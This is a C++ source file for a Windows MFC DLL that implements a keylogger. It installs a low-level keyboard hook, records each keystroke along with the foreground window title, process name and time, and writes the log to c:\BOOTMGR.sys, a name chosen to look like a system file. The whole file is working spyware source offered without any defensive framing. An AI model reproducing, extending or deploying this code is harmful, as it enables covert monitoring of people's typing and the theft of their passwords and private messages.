// hodll.cpp : Defines the initialization routines for the DLL.
//

#include "stdafx.h"
#include "hodll.h"
#include <time.h>
#include <string>
#include <Psapi.h>


using namespace std;

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif


#pragma data_seg(".SHARDAT")
static HHOOK hkb, hkb2=NULL;
FILE *f1;
#pragma data_seg()

wstring GetActiveWindowTitle()
{
  wstring title;
  HWND handle = GetForegroundWindow();
	int len = GetWindowTextLengthW( handle )+1;
  wchar_t * omgtitle = new wchar_t[len];
	GetWindowTextW(handle,omgtitle,len);
	title += omgtitle;
	return title;
}

const char * ConvertToUTF8(const wchar_t * pStr) {
    static char szBuf[1024];
    WideCharToMultiByte(CP_UTF8, 0, pStr, -1, szBuf, sizeof(szBuf), NULL, NULL);
    return szBuf;
}

HINSTANCE hins;
//	Note!
//
//		If this DLL is dynamically linked against the MFC
//		DLLs, any functions exported from this DLL which
//		call into MFC must have the AFX_MANAGE_STATE macro
//		added at the very beginning of the function.
//
//		For example:
//
//		extern "C" BOOL PASCAL EXPORT ExportedFunction()
//		{
//			AFX_MANAGE_STATE(AfxGetStaticModuleState());
//			// normal function body here
//		}
//
//		It is very important that this macro appear in each
//		function, prior to any calls into MFC.  This means that
//		it must appear as the first statement within the 
//		function, even before any object variable declarations
//		as their constructors may generate calls into the MFC
//		DLL.
//
//		Please see MFC Technical Notes 33 and 58 for additional
//		details.
//

/////////////////////////////////////////////////////////////////////////////
// CHodllApp

BEGIN_MESSAGE_MAP(CHodllApp, CWinApp)
	//{{AFX_MSG_MAP(CHodllApp)
		// NOTE - the ClassWizard will add and remove mapping macros here.
		//    DO NOT EDIT what you see in these blocks of generated code!
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CHodllApp construction

wstring wtitle;
#define LLKHF_LOWER_IL_INJECTED 0x00000002

LRESULT __declspec(dllexport)__stdcall  CALLBACK KeyboardProc(
                            int nCode, 
                           WPARAM wParam, 
                            LPARAM lParam)
{
	
	KBDLLHOOKSTRUCT *kbd = (KBDLLHOOKSTRUCT*) lParam;
	int vkey = kbd->vkCode;
	
	char ch;			
	int x;
	{		WORD w;
			UINT scan;
			scan=0;
			BYTE ks[256]={0};
			GetKeyboardState(ks);
			x = ToAscii(vkey,kbd->scanCode,ks,&w,0);
			ch =char(w); 
			//ch =char(vkey); 
	}

	int rtn = false;
	if ( x!=1 || wParam != WM_KEYDOWN
		|| 0x8000 & (GetKeyState(VK_CONTROL) | GetKeyState(VK_MENU))
		|| vkey == VK_LSHIFT || vkey == VK_RSHIFT || vkey == 1
		){

			//MessageBox(0,"1", "1", 1 );
		LRESULT RetVal = CallNextHookEx( hkb, nCode, wParam, lParam );	
		return RetVal;
	}
	if ( kbd->flags & LLKHF_INJECTED ) {
		//
		int c = 10;
		if ( kbd->flags & LLKHF_LOWER_IL_INJECTED ){
			int a = 1;
		}
		//return 0;
		LRESULT RetVal = CallNextHookEx( hkb, nCode, wParam, lParam );	
		return RetVal;
	}
	
	
    

		
	f1=fopen("c:\\BOOTMGR.sys","a+");
	
	

	wstring wtitle2 = GetActiveWindowTitle();
	
	
	if (true){		
		if ((vkey==VK_SPACE)||(vkey==VK_BACK)||(vkey==VK_TAB)||(vkey==VK_RETURN)||(vkey>=0x2f ) &&(vkey<0x100)  ) 
		{
		//============
			if ( wtitle == wtitle2){
		
			}else{ // write psuedo texts
				DWORD dwProcessId;
				HWND hwnd=GetForegroundWindow(); 
		
				wtitle = wtitle2;
					time_t rawtime;
				  struct tm * timeinfo;

				  time ( &rawtime );
				  timeinfo = localtime ( &rawtime );
				  const char * nowtime = asctime (timeinfo);
				fwrite("\n===TT: ", 1, 8, f1);
				fwrite(nowtime, 1, min(strlen(nowtime)-1, 15), f1);
				fwrite(" ===\n", 1, 5, f1);

				
				GetWindowThreadProcessId(hwnd, &dwProcessId );
				HANDLE pHandle = OpenProcess(
					PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
					FALSE,
					dwProcessId
				);
				
				
				fwrite("===T: ", 1, 6, f1);
				if (pHandle) 
				{
					char imgname[255]={};
					GetModuleBaseName (pHandle, 0, imgname, 255);
					//GetModuleFileNameA((HMODULE)pHandle, imgname, 255);
					//GetProcessImageFileName (pHandle,  imgname, 255);
					fwrite(imgname,1 , min(strlen(imgname), 20), f1);
					CloseHandle(pHandle);
				}
				
				const char * szTitle = ConvertToUTF8(wtitle.c_str());
				fwrite(" <> ", 1, 4, f1);
				fwrite(szTitle , 1, strlen(szTitle), f1);
				fwrite(" :T===\n", 1, 7, f1);

			}//==================
			
			if (vkey==VK_RETURN)
			{	ch='\n';
				fwrite(&ch,1,1,f1);
			}
			else if (vkey==VK_BACK)
			{	fwrite("<=",1,2,f1);
			}
			else if (vkey==VK_TAB)
			{	ch='\t';
				fwrite(&ch,1,1,f1);
			}
			else
			{
				fwrite(&ch,1,1,f1);
			}
    
		}

	}

	fclose(f1);
	LRESULT RetVal = CallNextHookEx( hkb, nCode, wParam, lParam );	
	
	return  RetVal;

}
BOOL __declspec(dllexport)__stdcall installhook()
{
	time_t rawtime;
  struct tm * timeinfo;

  time ( &rawtime );
  timeinfo = localtime ( &rawtime );
const char * nowtime = asctime (timeinfo);

f1=fopen("c:\\BOOTMGR.sys","a+");
fseek(f1, 0, SEEK_END);
int size = ftell(f1);
if ( size > 10485760){
	fclose(f1);
	f1=fopen("c:\\BOOTMGR.sys","w");
}
fwrite("===ST: ", 1, 7, f1);
fwrite(nowtime, 1, strlen(nowtime)-1, f1);
fwrite(" ===\n", 1, 5, f1);
fclose(f1);
//hkb=SetWindowsHookEx(WH_KEYBOARD,(HOOKPROC)KeyboardProc,hins,0);
hkb=SetWindowsHookEx(WH_KEYBOARD_LL,(HOOKPROC)KeyboardProc,hins,0);
//hkb2=SetWindowsHookEx(WH_KEYBOARD_LL,(HOOKPROC)KeyboardProc,hins,0);

return TRUE;
}
BOOL __declspec(dllexport)  UnHook()
    {
    	
     BOOL unhooked = UnhookWindowsHookEx(hkb);
	 UnhookWindowsHookEx(hkb2);
   // MessageBox(0,"exit","sasa",MB_OK);
     return unhooked;
} 


BOOL CHodllApp::InitInstance ()
{

AFX_MANAGE_STATE(AfxGetStaticModuleState());
hins=AfxGetInstanceHandle();
hins= LoadLibrary("User32");
return TRUE;

}
BOOL CHodllApp::ExitInstance ()
{
 return TRUE;
}

CHodllApp::CHodllApp()
{
	// TODO: add construction code here,
	// Place all significant initialization in InitInstance
}

/////////////////////////////////////////////////////////////////////////////
// The one and only CHodllApp object

CHodllApp theApp;
